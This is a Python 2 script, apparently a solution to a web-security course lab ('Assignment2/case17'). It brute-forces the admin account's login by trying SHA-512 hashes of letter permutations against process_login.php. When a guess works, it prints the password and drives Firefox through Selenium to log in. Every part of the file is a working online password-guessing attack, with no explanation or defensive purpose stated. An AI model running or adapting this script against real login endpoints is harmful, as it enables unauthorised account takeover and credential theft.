import httplib, urllib, urllib2
import hashlib, itertools

from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.keys import Keys

hdr = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
conn = httplib.HTTPConnection('www.wsb.com:80')
path = '/Assignment2/case17/includes/process_login.php'
found = False

def get_all_substrings(string):
   length = len(string)+1
   return [string[x:y] for x in range(length) for y in range(length) if string[x:y]]

def send_request(password):
  payload = urllib.urlencode({'email' : 'admin@admin.com', 'p' : password})
  conn.request('POST', path, payload, hdr)
  response = conn.getresponse()
  location = response.getheader('location', 'none')
  response.read()
  return location == '../protected_page.php'

def match(i):
  # permutate a-z small letters (in mixed order)
  comb = itertools.permutations("habcdsefgijlkmnopqrtuvxyz", i)
  for x in comb: 
    item = ''.join(x)
    hash = hashlib.sha512(item).hexdigest()
    print 'attempting: ', item
    if send_request(hash):
      global found
      found = True
      write(item, hash)
      break

def write(item, hash):
  print '\nemail: admin@admin.com ' + '\npassword:' + item + '\nhash:' + hash + '\n'
  print '\nopening your browser, logging you in.'

  location = "./geckodriver"
  firefox_capabilities = DesiredCapabilities.FIREFOX
  firefox_capabilities["marionette"] = True
  firefox_capabilities["binary"] = "/usr/bin/firefox"

  driver = webdriver.Firefox(capabilities=firefox_capabilities,executable_path=location)
  driver.get('http://wsb.com/Assignment2/case17/login.php')
  email = driver.find_element_by_name("email")
  password = driver.find_element_by_name("password")

  print email, password
  email.send_keys("admin@admin.com")
  password.send_keys(item)
  driver.find_element_by_xpath("/html/body/form/input[3]").click()
      
# tweak number to reduce time required
for i in range(4, 7):
  if not found: match(i)
  else: break

for i in range(1, 4):
  if not found: match(i)
  else: break

